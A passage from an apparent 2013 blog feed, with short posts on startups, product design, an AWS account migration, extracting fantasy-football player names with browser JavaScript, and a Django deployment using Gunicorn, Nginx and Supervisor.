<p>In many ways, freemium and free trial products are pursuing this strategy by allowing their products to be used with the hope that these users will turn into customers after they discover that they’re able to solve real problems using the product. A sales rep can then work with the customer to understand his needs and pick the right product offering to solve his problem.</p>

<p>I believe we’ll be seeing much more of these self serve, education products in the coming years and it’s important to get involved in this shift now. In my mind, the two companies that have been doing a great job with it are <a href="http://newrelic.com/" target="_blank">New Relic</a> which is providing a great way to try their monitoring service and Mixpanel, which has a <a href="https://mixpanel.com/education" target="_blank">dedicated portal</a> focusing on analytics education.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Design anti pattern: footer under infinite scroll</title>
   <link href="http://dangoldin.com/2013/09/03/design-anti-pattern-footer-under-infinite-scroll/"/>
   <updated>2013-09-03T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/09/03/design-anti-pattern-footer-under-infinite-scroll</id>
   <content:encoded><![CDATA[
<ul class="thumbnails">
  <li class="span7">
  	<div class="thumbnail">
  		<a href="http://dangoldin.com/assets/static/images/damn-it-linkedin.png">
      		<img src="http://dangoldin.com/assets/static/images/damn-it-linkedin.png" alt="LinkedIn infinite scroll and footer" width="1482" height="801" layout="responsive"/>
      	</a>
    </div>
  </li>
</ul>

<p>I’m not sure why this needs to be said but if your site offers infinite scroll make sure you don’t have anything clickable in the footer. I’d expect the occasional site to succumb to this but I was surprised to see it happening on LinkedIn. All I wanted to do was read the developer docs but unfortunately the link is located in the footer which provides a nice challenge of clicking the link before new content is loaded. I wasn’t quite able to get it and ended up just searching Google for the LinkedIn documentation link. If your site’s content is only accessible via a Google search you have a problem.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Startups aren't black and white</title>
   <link href="http://dangoldin.com/2013/09/02/startups-arent-black-and-white/"/>
   <updated>2013-09-02T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/09/02/startups-arent-black-and-white</id>
   <content:encoded><![CDATA[
<p>When I was making the leap into the startup world I read every post I came across that talked about people’s experiences and guides in running a startup. The goal was to learn as much as I could form others and apply these hard-fought lessons my own startup. Now that I’ve been working on a startup for almost two years I realize how much startups differ from one another and how black and white these guides tend to be. You can read two posts that will promote contradictory approaches. Should you focus on revenue or growth? Should you raise money or bootstrap? Should you go with a freemium model or paid only? Should you go solo or get a cofounder? Should you focus on consumers or the enterprise?</p>

<p>None of these questions have a universally right answer. What worked for one startup will not necessarily work for another one. There are just too many differences; the product, market, teams are all different. Time plays a huge factor as well. In a field as quickly moving, and novelty loving, as technology what worked 6 months ago may not have a chance right now. Startups are tough. If it were as simple as just following a how-to guide the success rate of startups would be an order of magnitude higher than what it actually is.</p>

<p>The best we can do is be aware of the available options and try to understand why certain strategies worked for others. We shouldn’t ignore what we read but we also shouldn’t emulate an approach just because others succeeded with it. We need to be the experts of our markets and imitating others only undermines that knowledge.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Simplicity vs power in product design</title>
   <link href="http://dangoldin.com/2013/08/28/simplicity-vs-power-in-product-design/"/>
   <updated>2013-08-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/08/28/simplicity-vs-power-in-product-design</id>
   <content:encoded><![CDATA[
<p>Although I come from a backend background, I’ve been spending more and more time on the UX side of things and have been picking up quite a bit - a combination of using Twitter Bootstrap on my projects, subscribing to the Hack Design lectures, and following a ton of designers on Twitter.</p>

<p>Something that’s been bothering me is this obsession with trying to make every product as intuitive and approachable as possible. That’s the right approach when focusing on mass market consumer products but if you’re building internal tools or targeting power users a simple, approachable product might be antithetical to what you actually need.</p>

<p>The tradeoff is between a product that people can immediately start using versus a product that takes time to learn but becomes significantly more powerful when mastered. The developer equivalent would be using a basic text editor vs vi or emacs. The text editor is easy to start using but you hit a productivity ceiling quickly; vi or emacs, on the other hand, take a while to learn but you become significantly more productive than if you were using a text editor.</p>

<p>The challenge is knowing your audience and building the product that will solve their problems. Sometimes it will need to be simple and other times it will need to be complex. This applies at multiple levels - the product may for the most part be simple but certain features will need to be complex in order to be useful.</p>

<p>Many websites and apps have adopted the approach of where it’s extremely easy to get started but provide advanced features for the users that desire and discover them. Excel provides shortcuts for the power user that make it possible to do anything without touching the mouse. Gmail, in addition to shortcuts, provides a “labs” feature that lets users enable more advanced features.</p>

<p>I’m interested in what happens as companies grow and try to increase their market. Some may have started with a complex product that solved a niche problem that they want to simplify in order to appeal to a bigger audience. Others may have started with a simple product that they now want to position to power users. In both cases the challenge is being able to support both use cases without negatively impacting either one. Maybe the right approach is to launch the new product under a different name but I’m curious to see creative solutions that aren’t about adding shortcuts or a settings page.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Extract info from a web page using JavaScript</title>
   <link href="http://dangoldin.com/2013/08/26/extract-info-from-a-web-page-using-javascript/"/>
   <updated>2013-08-26T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/08/26/extract-info-from-a-web-page-using-javascript</id>
   <content:encoded><![CDATA[
<p>How many times have you tried copying something from a webpage into Excel and discovering that the formatting got completely messed up and forced you to clean the data up manually? With just a bit of knowledge about HTML and CSS you can use JavaScript to get the information you want without having to struggle with the formatting issues.</p>

<p>In my case, I participated in a fantasy football draft and wanted to share the list of players I drafted with a friend. Unfortunately, copying and pasting didn’t work so I decided to jump into JavaScript. Hope these steps give a sense of how to approach a simple scraping problem. The idea is to use the browser’s inspect element feature to find the pattern that the element we’re interested in have in common. Then, we use JavaScript to find the elements matching that pattern and extract the information we want.</p>

<ul class="thumbnails">
  <li class="span8">
    <div class="thumbnail">
    <p>1. The page we want to parse - please ignore the quality of my fantasy team.</p>
      <img src="http://dangoldin.com/assets/static/images/ff-roster.jpeg" alt="My fantasy roster" width="1038" height="800" layout="responsive"/>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
    	<p>2. Use the Chrome "Inspect Element" feature to figure out the HTML/CSS of the element we're interested in. In this case, the element containing player name has the class value “name playernote”.</p>
      <img src="http://dangoldin.com/assets/static/images/ff-roster-source.jpeg" alt="Using inspect element to identify the HTML/CSS for the elements" width="1370" height="800" layout="responsive"/>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
    	<p>3. Run a JavaScript command to get all the HTML elements that have those classes.
      	
<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="dl">'</span><span class="s1">name playernote</span><span class="dl">'</span><span class="p">)</span></code></pre></figure>

      </p>
      <img src="http://dangoldin.com/assets/static/images/ff-roster-get-players.jpeg" alt="JavaScript to get the elements matching our CSS query" width="4166" height="800" layout="responsive"/>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
    	<p>4. Store those HTML elements in a variable so we can quickly iterate through the list.
		
<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">players</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="dl">'</span><span class="s1">name playernote</span><span class="dl">'</span><span class="p">)</span></code></pre></figure>

      </p>
      <img src="http://dangoldin.com/assets/static/images/ff-roster-get-players-2.jpeg" alt="Store the elements in a variable" width="4592" height="800" layout="responsive"/>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
    	<p>5. Use JavaScript to go through the previous list and extract the player name. Then we can just copy and paste the list of names without having to deal with the formatting issues.
      	
<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">players</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span> <span class="nx">players</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">textContent</span> <span class="p">);</span> <span class="p">}</span></code></pre></figure>

      </p>
      <img src="http://dangoldin.com/assets/static/images/ff-roster-get-player-names.jpeg" alt="Iterate through the list to extract the player name" width="3838" height="800" layout="responsive"/>
    </div>
  </li>
</ul>

<p>In addition to extracting information, JavaScript can be used to interact with a web page. This comes in handy when you want to automate a certain action on a site that would take too long to do manually. For example, I was able to code up some quick JavaScript that would go through a list of my Facebook friends and invite them to like my startup’s new page. Hope this little JavaScript hack comes in handy and let me know if you have any questions.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Splitting an AWS account</title>
   <link href="http://dangoldin.com/2013/08/24/splitting-an-aws-account/"/>
   <updated>2013-08-24T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/08/24/splitting-an-aws-account</id>
   <content:encoded><![CDATA[
<p>When we launched <a href="http://getpressi.com" target="_blank">Pressi</a>, I had it set up under my personal AWS account. Recently, we needed to move it into a separate AWS account and I wanted to share the steps to help others running into the same issue. Unsurprisingly, most of the effort went into planning and figuring out the migration steps and order in which they should be done. We weren’t able to eliminate downtime entirely but we reduced it as much as we could.</p>

<p>The services migrated included Route 53, an EC2 instance, ELB, S3, and Cloudfront. At the high level, we copy every service we can (EC2, ELB, S3, Route 53) to the destination account before redirecting client traffic to the new account. After that, we migrate the remaining services (Cloudfront) and make updates to existing ones (Route 53, EC2) to point to the destination account.</p>

<p>Migrating EC2 and ELB:</p>

<ul class="bulleted">
	<li>Create the destination AWS account</li>
	<li>Create an AMI of the instance on the original account</li>
	<li>Share this newly created AMI with the destination AWS account</li>
	<li>Launch the AMI in the destination account</li>
	<li>Set up the load balancer in the destination account to mirror the original</li>
</ul>

<p>Migrating S3/Cloudfront:</p>

<ul class="bulleted">
	<li>Create an S3 bucket in the destination account and copy the files over from the original bucket to the destination bucket. We used <a href="http://www.bucketexplorer.com/be-download.html" target="_blank">Bucket Explorer</a> for this piece but needed to change the file permissions in the destination bucket manually to mirror those in the original account. One thing to watch out for is that S3 bucket names need to be unique so your code will need to be updated to reference the new name.</li>
	<li>Update the Cloudfront record in Route 53 to point to the destination account. Note that after the migration runs you can also update the Cloudfront record in the original account to point to the Cloudfront CNAME of the destination account.</li>
	<li>Cloudfront requires unique CNAME records so we give it a temporary name until you kick off the migration. As soon as you do, you will need to remove the CNAME record from the original account and add it to the destination Cloudfront account.</li>
</ul>

<p>Migrating Route 53:</p>

<ul class="bulleted">
	<li>Copy the records from the original account to the destination account.</li>
	<li>Make sure to update the Start of Authority (SOA) and Name Server (NS) records in the original account to have the same values as the ones in the destination account to speed up the DNS propagation.</li>
</ul>

<p>Migrating the code:</p>

<ul class="bulleted">
	<li>This will entirely depend on the application but the goal is to update your code to reference the services on the destination account.</li>
	<li>Due to the non-immediate nature of DNS propagation, you will most likely need to run two code bases - one on the original account pointing to some of the original services and one on the new account pointing to the destination services. Depending on the statelessness of your code, this may lead to a variety of sync issues and will require some intricate code to handle properly. In our case, we had MySQL running on the EC2 instance so while the app was running simultaneously under two AWS accounts the database would get out of sync with some users hitting the original setup and others hitting the destination. Luckily for us only a few tables were affected and we had to run a few manual SQL queries to deal with the issue but it could have been a lot worse.</li>
</ul>

<p>The last step is to update your domain registrar NS records to point to the destination account and wait for the migration to occur. Note that the migration will happen gradually so you should look at the server logs on both accounts to make sure there’s no traffic hitting the server in the original account.</p>

<p>The lesson here is that migration becomes a whole lot easier if you keep your architecture as stateless and modular as possible. This way the services are loosely coupled and can be migrated one at a time rather than having to do everything at once. Your app also becomes significantly easier to scale since additional EC2 instances can be provisioned without having to worry about them getting out of sync. The non-instantaneous nature of DNS complicates the migration but a stateless architecture helps address most of the issues. Our migration didn’t go 100% smoothly but having mostly stateless services definitely helped us avoid major problems.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>On Teaching AP Computer Science</title>
   <link href="http://dangoldin.com/2013/08/18/on-teaching-ap-computer-science/"/>
   <updated>2013-08-18T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/08/18/on-teaching-ap-computer-science</id>
   <content:encoded><![CDATA[
<p>This year, I started volunteering at a program called <a href="http://tealsk12.org/" target="_blank">TEALS</a>. The long term goal is to improve computer science education in the United States by having tech professionals volunteer their time to teach computer science classes in schools that want to offer computer science classes but don’t have the necessary teachers. Over time, the goal is to have the in-service teachers in each class learn the material so that they will be able to teach it in the future. Currently, the program exists in 65 high schools across 12 states and offers both Intro to Computer Science and AP Computer Science but I’m looking forward to seeing it expand nationwide and into middle and elementary schools.</p>

<p>Throughout the year, I plan on documenting my experiences remote teaching at a high school in Kentucky as well as sharing the lessons I’ve learned. So far, it’s been a little more than a week and I already developed a much bigger appreciation for teachers and the effort required. The most time consuming piece so far has been preparing daily lessons that balance the requirements of the AP test and everyone’s skills and interests while still being engaging enough when delivered via a video chat. I also discovered the difference between lecturing and teaching: my initial approach was to just go through the prepared slides but am now spending a lot more time thinking about tricky concepts and the exercises that will both get the point across and keep students engaged. The best approach so far has been starting a class with a brief explanation of the concepts, going through some tricky exercises, and then diving into code to put it all together.</p>

<p>If you have computer science experience this is a awesome program to volunteer for so please feel free to reach out to me if you have any questions.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Netflix profiles, why now?</title>
   <link href="http://dangoldin.com/2013/08/14/netflix-profiles-why-now/"/>
   <updated>2013-08-14T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/08/14/netflix-profiles-why-now</id>
   <content:encoded><![CDATA[
<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/netflix-logo.jpg" alt="Netflix Logo" width="200" height="200" layout="responsive"/>
</div>

<p>
<a href="http://netflix.com/" target="_blank">Netflix</a> recently reintroduced <a href="http://blog.netflix.com/2013/08/make-netflix-your-own-with-profiles.html" target="_blank">profiles</a> so now each household member can get their own recommendations, recently watched items, and instant queue rather than being forced to share the same polluted profile. This is an awesome win for Netflix customers but it’s been bugging me that they didn’t do this sooner; it’s such an obvious feature that it should have been built as soon as Netflix realized that multiple family members would be sharing their account.
</p>

<p>The cynic in me says they waited 5 years to bring profiles back in order to force family members to sign up for additional Netflix accounts if they wanted to keep their account history private and the only reason they enabled this functionality now is that they’ve either already captured the bulk of these additional accounts or that customers have been asking for this for so long that ignoring the requests makes Netflix look callous. Even now, the profile functionality remains open with all users of a Netflix account being able to access any of the profiles, forcing household members who value their privacy to sign up for additional accounts.</p>

<p>I may be completely wrong and Netflix is correct that making profiles more complicated will cause significantly more usability problems for the majority of users while only benefiting a tiny percentage of customers that care about private profiles. Simplicity is critical for the success of a consumer product but I’m skeptical when user experience and simplicity are used as excuses to avoid a simple feature change. In this case it could be as simple as adopting a model similar to <a href="https://help.netflix.com/article/en/node/10421" target="_blank">parental controls</a> which are set via the web interface for each profile.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Rise of flat design</title>
   <link href="http://dangoldin.com/2013/08/11/rise-of-flat-design/"/>
   <updated>2013-08-11T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/08/11/rise-of-flat-design</id>
   <content:encoded><![CDATA[
<p>I don’t know whether it’s due to the upcoming version of iOS or Windows 8 but it feels as if flat design is getting more and more common. In the past couple of weeks, I’ve noticed two “mainstream” sites, <a href="http://thesaurus.com/" target="_blank">Thesaurus.com</a> and <a href="https://www.optimum.net/" target="_blank">Optimum</a>, adopt a flat design which I suspect is the first design change they’ve made in years. Many companies are updating their iOS apps in time for the fall release and I understand the motivation to want to fit the style but it’s interesting to see websites doing the same. I wonder whether we’ll see more sites adopting this flat design in the next couple of months.</p>

<ul class="thumbnails">
  <li class="span8">
  	<div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/flat-optimum.png" alt="Optimum.net screenshot" width="1396" height="833" layout="responsive"/>
    </div>
  </li>
  <li class="span8">
  	<div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/flat-dictionary.png" alt="Thesaurus.com screenshot" width="1354" height="832" layout="responsive"/>
    </div>
  </li>
 </ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Introducing Better 404</title>
   <link href="http://dangoldin.com/2013/08/07/introducing-better-404/"/>
   <updated>2013-08-07T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/08/07/introducing-better-404</id>
   <content:encoded><![CDATA[
<p>I don’t understand why websites try to compete on having the cleverest 404 page. The fact that someone ended up on a 404 page is a sign that something is broken but instead of trying to fix the problem they try to distract their visitors by making them laugh. It’s equivalent to getting to a restaurant and seeing an amazing menu only to discover that it’s closed.</p>

<p>We can’t always control which URLs our visitors will type in or click on but we can control what they see when they get there. Instead of trying to distract them with humor why not offer suggestions for what they may have wanted to see? The majority of 404 visits are the result of typos which could be fixed with a simple spell check and the remainder are due to moved pages which can be solved by notifying the linker or providing a redirect.</p>

<p>I’ve had some free time over the past month and put together the basics of a simple tool to help sites improve their 404 pages. Appropriately, it’s called <a href="http://better404.com/" target="_blank">Better 404</a> and I’m currently running a beta period to get feedback and work out any kinks. If you manage a site and are interested in trying this out, let me know and I’ll help you get started.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A brief history of manufacturing</title>
   <link href="http://dangoldin.com/2013/08/02/a-brief-history-of-manufacturing/"/>
   <updated>2013-08-02T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/08/02/a-brief-history-of-manufacturing</id>
   <content:encoded><![CDATA[
<p>Working on <a href="https://makersalley.com/" target="_blank">Makers Alley</a>, I’ve spent a fair amount thinking about the evolution of manufacturing and wanted to share an extremely condensed history.</p>

<p>For most of human history, people either made what they needed on their own or traded with a local craftsman. Over time, this led to a specialization in skills and also the rise of the apprenticeship model. Since trade was mostly local, it was difficult to build a large business and most businesses were family run with parents passing down skills to their children.</p>

<p>This practice remained consistent until a couple of hundred years ago when water and steam power starting taking hold. For the first time, work could be done independently of human labor and started the trend of specialized machines replacing specialized people. The increase in machine efficiency and the reduced skill of workers led to drops in the cost of labor and cheaper products.</p>

<p>The next major shift occurred when electricity became prevalent. This allowed factories to be built anywhere power was available and the locations were now chosen based on the price of labor and the cost of shopping. Thus, many factories ended up being built near cities with harbors and railroads.</p>

<p>At this point, globalization was still in its infancy since the transportation costs were extremely high due to lack of automation and standardization. Only when containerized shipping took off in the second half of the 20th century did shipping costs plunge and allowed companies to move their factories to locations with even lower labor costs. On a side note, read Marc Levinson’s <a href="http://www.amazon.com/The-Box-Shipping-Container-Smaller/dp/0691136408" target="_blank">The Box</a> to understand the impact of the shipping container.</p>

<p>This is the current situation with the majority of manufacturing being done abroad using materials that are sourced from across the world and then shipped and sold worldwide as final products. It’s impossible to predict what will happen over the coming decades but the combination of rising labor costs, demand for customizable products, and 3D printing suggest that manufacturing is going to start moving back towards local, agile methods. At first, it will probably be a hybrid approach with the bulk of the components still being mass made but then customized in our homes from 3D printed parts. Over time, as the quality and cost of 3D printing improves, more and more of the components will be customized, printed, and assembled at home. We’ll see the creation of a new profession - a combination of industrial designer, modeler, and tastemaker who’ll need to help us navigate this new manufacturing world. I’m excited.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Run Django under Nginx, Virtualenv and Supervisor</title>
   <link href="http://dangoldin.com/2013/07/30/run-django-under-nginx-virtualenv-and-supervisor/"/>
   <updated>2013-07-30T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/07/30/run-django-under-nginx-virtualenv-and-supervisor</id>
   <content:encoded><![CDATA[
<p>After yet another attempt to deploy a <a href="https://www.djangoproject.com/" target="_blank">Django</a> application I decided to document the steps required to get everything up and running. The tutorials I’ve seen tend to focus on individual pieces rather than on the way all these packages work together which always led to me a lot of dead ends and StackOverflow so this will hopefully address some of those issues.</p>

<p>In particular, I want to focus on the configuration rather than the installation of the various packages since that’s covered in the package documentation.</p>

<p>I don’t know if this is the best way to deploy Django but it’s the approach I’ve been able to come up with by stumbling around and getting help from the docs, Google, and StackOverflow. If there are better ways out there please let me know.</p>

<ul class="bulleted">
	<li>
		<p><strong>Gunicorn</strong>- /home/ubuntu/project/scripts/start.sh</p>
		<p>The nice thing here is that we define the port to serve our application on so we can serve multiple projects on a single server with each one using a different port. Note that the settings approach used here is from <a href="https://github.com/twoscoops/django-twoscoops-project/tree/develop/project_name/project_name/settings" target="_blank">Two Scoops of Django</a>.
		</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
<span class="nb">set</span> <span class="nt">-e</span>
<span class="nv">DJANGODIR</span><span class="o">=</span>/home/ubuntu/project
<span class="nv">DJANGO_SETTINGS_MODULE</span><span class="o">=</span>project.settings.prod

<span class="nv">LOGFILE</span><span class="o">=</span>/var/log/gunicorn/guni-project.log
<span class="nv">LOGDIR</span><span class="o">=</span><span class="si">$(</span><span class="nb">dirname</span> <span class="nv">$LOGFILE</span><span class="si">)</span>
<span class="nv">NUM_WORKERS</span><span class="o">=</span>3
<span class="c"># user/group to run as</span>
<span class="nv">USER</span><span class="o">=</span>ubuntu
<span class="nv">GROUP</span><span class="o">=</span>ubuntu
<span class="nb">cd</span> /home/ubuntu/project
<span class="nb">source</span> /home/ubuntu/project/venv/bin/activate

<span class="nb">export </span><span class="nv">DJANGO_SETTINGS_MODULE</span><span class="o">=</span><span class="nv">$DJANGO_SETTINGS_MODULE</span>
<span class="nb">export </span><span class="nv">PYTHONPATH</span><span class="o">=</span><span class="nv">$DJANGODIR</span>:<span class="nv">$PYTHONPATH</span>

<span class="nb">test</span> <span class="nt">-d</span> <span class="nv">$LOGDIR</span> <span class="o">||</span> <span class="nb">mkdir</span> <span class="nt">-p</span> <span class="nv">$LOGDIR</span>
<span class="nb">exec</span> /home/ubuntu/project/venv/bin/gunicorn_django <span class="nt">-w</span> <span class="nv">$NUM_WORKERS</span> <span class="se">\</span>
  <span class="nt">--user</span><span class="o">=</span><span class="nv">$USER</span> <span class="nt">--group</span><span class="o">=</span><span class="nv">$GROUP</span> <span class="nt">--log-level</span><span class="o">=</span>debug <span class="se">\</span>
  <span class="nt">--log-file</span><span class="o">=</span><span class="nv">$LOGFILE</span> <span class="nt">-b</span> 0.0.0.0:8001 2&gt;&gt;<span class="nv">$LOGFILE</span></code></pre></figure>

</li>

<li>
	<p><strong>Nginx</strong> - /etc/nginx/sites-enabled/project</p>
	<p>The key parts here are that we're redirecting all www.project.com requests to project.com, serving the static files using Nginx rather than rely on Gunicorn, and passing other requests to the Gunicorn server running on the port defined in the Gunicorn start script above.
	</p>

<figure class="highlight"><pre><code class="language-nginx" data-lang="nginx"><span class="k">server</span> <span class="p">{</span>
    <span class="c1"># Redirect all www.project.com requests to project.com</span>
    <span class="kn">listen</span> <span class="mi">80</span><span class="p">;</span>
    <span class="kn">server_name</span> <span class="s">www.project.com</span><span class="p">;</span>
    <span class="kn">return</span> <span class="mi">301</span> <span class="s">http://project.com</span><span class="nv">$request_uri</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">server</span> <span class="p">{</span>
    <span class="kn">listen</span>   <span class="mi">80</span><span class="p">;</span>
    <span class="kn">server_name</span> <span class="s">project.com</span><span class="p">;</span>
    <span class="c1"># no security problem here, since / is alway passed to upstream</span>
    <span class="kn">root</span> <span class="n">/home/ubuntu/project/</span><span class="p">;</span>
    <span class="c1"># serve directly - analogous for static/staticfiles</span>
    <span class="kn">location</span> <span class="n">/media/</span> <span class="p">{</span>
        <span class="c1"># if asset versioning is used</span>
        <span class="kn">if</span> <span class="s">(</span><span class="nv">$query_string</span><span class="s">)</span> <span class="p">{</span>
            <span class="kn">expires</span> <span class="s">max</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="kn">location</span> <span class="n">/admin/media/</span> <span class="p">{</span>
        <span class="c1"># this changes depending on your python version</span>
        <span class="kn">root</span> <span class="n">/home/ubuntu/project/venv/lib/python2.7/site-packages/django/contrib</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kn">location</span> <span class="n">/static/admin</span> <span class="p">{</span>
        <span class="kn">autoindex</span> <span class="no">on</span><span class="p">;</span>
        <span class="kn">root</span>   <span class="n">/home/ubuntu/project/venv/lib/python2.7/site-packages/django/contrib/admin/</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kn">location</span> <span class="n">/static/</span> <span class="p">{</span>
        <span class="kn">autoindex</span> <span class="no">on</span><span class="p">;</span>
        <span class="kn">alias</span>   <span class="n">/home/ubuntu/project/assets/</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kn">location</span> <span class="n">/</span> <span class="p">{</span>
    <span class="c1"># This section is to redirect all http traffic to https if desired</span>
    <span class="c1"># if ($http_x_forwarded_proto != 'https') {</span>
    <span class="c1">#   rewrite ^ https://$host$request_uri? permanent;</span>
    <span class="c1"># }</span>

        <span class="kn">client_max_body_size</span> <span class="mi">5M</span><span class="p">;</span>
        <span class="kn">client_body_buffer_size</span> <span class="mi">128k</span><span class="p">;</span>
        <span class="kn">proxy_pass_header</span> <span class="s">Server</span><span class="p">;</span>
        <span class="kn">proxy_set_header</span> <span class="s">Host</span> <span class="nv">$http_host</span><span class="p">;</span>
        <span class="kn">proxy_redirect</span> <span class="no">off</span><span class="p">;</span>
        <span class="kn">proxy_set_header</span> <span class="s">X-Real-IP</span> <span class="nv">$remote_addr</span><span class="p">;</span>
        <span class="kn">proxy_set_header</span> <span class="s">X-Scheme</span> <span class="nv">$scheme</span><span class="p">;</span>
        <span class="kn">proxy_connect_timeout</span> <span class="mi">300</span><span class="p">;</span>
        <span class="kn">proxy_read_timeout</span> <span class="mi">300</span><span class="p">;</span>
        <span class="kn">proxy_pass</span> <span class="s">http://127.0.0.1:8001/</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1"># what to serve if upstream is not available or crashes</span>
    <span class="kn">error_page</span> <span class="mi">500</span> <span class="mi">502</span> <span class="mi">503</span> <span class="mi">504</span> <span class="n">/media/50x.html</span><span class="p">;</span></code></pre></figure>

</li>

<li>
	<p><strong>Supervisord</strong> - /etc/supervisord/gunicorn-project.conf</p>
	<p>Here we just specify the location of the Gunicorn start script so Supervisor can manage it.</p>

<figure class="highlight"><pre><code class="language-ini" data-lang="ini"><span class="nn">[program:gunicorn-project]</span>
<span class="py">directory</span> <span class="p">=</span> <span class="s">/home/ubuntu/project</span>
<span class="py">user</span> <span class="p">=</span> <span class="s">ubuntu</span>
<span class="py">command</span> <span class="p">=</span> <span class="s">/home/ubuntu/project/scripts/start.sh</span>
<span class="py">stdout_logfile</span> <span class="p">=</span> <span class="s">/var/log/gunicorn/project-std.log</span>
<span class="py">stderr_logfile</span> <span class="p">=</span> <span class="s">/var/log/gunicorn/project-err.log</span></code></pre></figure>

</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The power inbox</title>
   <link href="http://dangoldin.com/2013/07/27/the-power-inbox/"/>
   <updated>2013-07-27T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/07/27/the-power-inbox</id>
   <content:encoded><![CDATA[
<p>There are only a few tabs I consistently keep open all day on my computer - Gmail, Google Calendar, Hacker News, and New Relic. Out of these, Gmail is the most important with my entire day running through it. The value of having a presence in the inbox hasn’t been lost on companies and there are a ton of third party apps that make Gmail more useful - <a href="http://rapportive.com/" target="_blank">Rapportive</a>, <a href="http://www.yesware.com/" target="_blank">YesWare</a>, <a href="http://www1.toutapp.com/" target="_blank">ToutApp</a>, and <a href="http://www.baydin.com/" target="_blank">Boomerang</a>. Even Google itself has been providing “Lab features” to augment the default inbox behavior.</p>

<p>One thing that bothers me is that this additional functionality is only provided via browser extensions. The only time I recall seeing an interactive behavior is when a form is embedded in an email and even then it’s at the mercy of the <a href="http://www.campaignmonitor.com/blog/post/2435/how-forms-perform-in-html-emai/" target="_blank">email client’s implementation</a>. I’d love to see a new inbox standard adopted that allowed email messages to be richer and more interactive rather than having to rely on a separate browser extension. Imagine being able to send out surveys that can be completed without leaving an email, emails that are able to show whether a product is available in real time (I know this can be done via server side rendered images but it’s a hack), or being able to change the content text based on the time the email is viewed. These are trivial examples but this would open up potential for uses that we can’t even imagine. Of course, we’d have to be even more wary of smarter spam and inbox trickery but the potential value is worth that cost.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Security through monopoly</title>
   <link href="http://dangoldin.com/2013/07/22/security-through-monopoly/"/>
   <updated>2013-07-22T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/07/22/security-through-monopoly</id>
   <content:encoded><![CDATA[
<p>A month ago I needed to duplicate a set of keys. In the past, I’d just go to the cheapest looking hardware store and they’d easily replicate my keys for around $2 each. This time, I tried the same approach but was told that they weren’t authorized to handle the keys I had and directed me to another locksmith. That locksmith told me that they wouldn’t be able to duplicate it without approval from my management company and also charged $18 for a duplicate. Amazingly enough, they were only able to duplicate one of the keys and I had to go to yet another locksmith (and get another approval) to get the last key duplicated.</p>

<p>I’m not sure if they’re trying to increase the security or whether they’re just trying to create an artificial monopoly for the locksmiths but it’s definitely a pain in the ass for the consumer. This is a standard approach for many industries: add needless complexity under the guise of security and then use that to justify higher prices. This is also why additional regulation isn’t always the answer - it leads to complicated, entrenched systems that can’t be easily innovated upon.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Beware the data monopoly</title>
   <link href="http://dangoldin.com/2013/07/21/beware-the-data-monopoly/"/>
   <updated>2013-07-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/07/21/beware-the-data-monopoly</id>
   <content:encoded><![CDATA[
<p>I’m convinced that the future of software lies in data. Data has always been important but now we actually have cheap ways of analyzing it with constant improvements in data extraction and machine learning algorithms. We’re also tethered to our digital devices which are collecting tons of data that’s waiting to be analyzed.</p>

